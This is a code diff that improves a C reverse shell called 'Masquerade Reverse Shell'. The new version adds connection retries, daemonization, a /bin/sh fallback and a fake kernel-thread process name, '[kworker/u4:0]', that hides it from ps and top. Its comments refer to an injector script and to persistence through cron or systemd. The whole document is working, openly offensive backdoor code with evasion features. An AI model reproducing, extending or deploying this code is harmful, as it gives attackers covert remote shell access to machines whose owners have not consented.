@@ -1,11 +1,10 @@
 /*
- * Masquerade Reverse Shell
- * This source is a template. IP/PORT/NAME are placeholders.
+ * Masquerade Reverse Shell (Robust Version)
  * 
- * Concept:
- * Instead of running `bash -i` directly which shows up in Process List,
- * We execute bash but pass a fake name (e.g., [kworker/u4:0]) as argv[0].
- * Linux utilities like ps/top display argv[0].
+ * Improvements:
+ * - Retry logic for connection (5 tries).
+ * - Fallback to /bin/sh if /bin/bash fails.
+ * - Proper process naming to avoid suspicious "[kworker...]" in some views if execve fails.
  */
 
 #include <stdio.h>
@@ -16,43 +15,61 @@
 #include <sys/socket.h>
 #include <string.h>
 #include <stdlib.h>
+#include <errno.h>
 
-// These will be replaced by the injector script
+// Placeholders
 #define REMOTE_ADDR "127.0.0.1"
 #define REMOTE_PORT 4444
 #define FAKE_NAME "[kworker/u4:0]"
 
-int main(int argc, char *argv[]) {
-    // Fork to detach from parent (optional but good for stability)
-    pid_t pid = fork();
-    if (pid > 0) return 0; // Parent exits
-    if (pid < 0) return 1;
-
+void try_connect() {
     struct sockaddr_in sa;
     int s;
+    int retries = 0;
 
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
-    sa.sin_port = htons(REMOTE_PORT);
+    while (1) {
+        s = socket(AF_INET, SOCK_STREAM, 0);
+        if (s < 0) {
+            sleep(5);
+            continue;
+        }
 
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    
-    // Connect with retry logic? 
-    // For simplicity, we try once. Persistence mechanism (cron/systemd) handles retries.
-    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
-        return 1;
+        sa.sin_family = AF_INET;
+        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+        sa.sin_port = htons(REMOTE_PORT);
+
+        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
+            // Connected!
+            break;
+        }
+        
+        close(s);
+        sleep(5); // Wait 5s before retry
+        // In persistence mode, we might want to loop forever or exit to let systemd restart us.
+        // For simple C binary, let's retry a few times then exit (so init system restarts us properly)
+        retries++;
+        if (retries > 10) exit(1); 
     }
 
-    // Redirect streams to socket
     dup2(s, 0);
     dup2(s, 1);
     dup2(s, 2);
 
-    // Cloak and Execute
-    // We call /bin/bash, but we tell it that its name is FAKE_NAME
-    // We pass "-p" to preserve permissions if SUID, and "-i" for interactive
+    // Try Bash first
     char *args[] = {FAKE_NAME, "-p", "-i", NULL};
     execve("/bin/bash", args, NULL);
     
+    // Fallback to Sh if Bash fails
+    execve("/bin/sh", args, NULL);
+}
+
+int main(int argc, char *argv[]) {
+    // Daemonize essentially
+    pid_t pid = fork();
+    if (pid > 0) return 0;
+    if (pid < 0) return 1;
+    setsid();
+
+    try_connect();
     return 0;
 }
